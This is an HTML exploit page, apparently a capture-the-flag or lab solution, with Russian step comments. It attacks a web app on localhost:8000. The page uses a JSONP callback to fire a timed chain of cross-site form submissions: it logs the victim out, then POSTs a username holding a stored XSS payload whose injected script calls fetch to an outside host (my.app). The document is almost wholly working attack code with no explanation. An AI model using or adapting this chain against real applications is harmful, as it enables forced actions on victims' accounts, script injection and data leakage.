<!DOCTYPE html>
<html>
<body>

  <!-- Шаг 1: GET /#/sheets -->
  <form id="f1" target="worker" action="http://localhost:8000/#/sheets" method="GET"></form>

  <!-- Шаг 2: GET /api/logout -->
  <form id="f2" target="worker" action="http://localhost:8000/api/logout" method="GET"></form>

  <!-- Шаг 3: POST /api/whoami -->
  <form id="f3" target="worker" action="http://localhost:8000/api/whoami"
        method="POST" enctype="text/plain">
    <input name='{"new_username":"<</textarea><iframe/srcdoc' value='&lt;script/src=data:text/javascript,fetch(`https://my.app?k=hi`)&gt;&lt;/script&gt;></iframe>"}'>
  </form>

  <!-- Шаг 4: GET /#/settings -->
  <form id="f4" target="worker" action="http://localhost:8000/#/settings" method="GET"></form>

  <script>
    function exploit(data) {
        window.open('', 'worker');

        setTimeout(() => { document.getElementById('f1').submit(); }, 3000);
        setTimeout(() => { document.getElementById('f2').submit(); }, 6000);
        setTimeout(() => { document.getElementById('f3').submit(); }, 9000);
        setTimeout(() => { document.getElementById('f4').submit(); }, 12000);
    }
  </script>

<script src=http://localhost:8000/api/whoami/jsonp?callback=exploit></script>

</body>
</html>
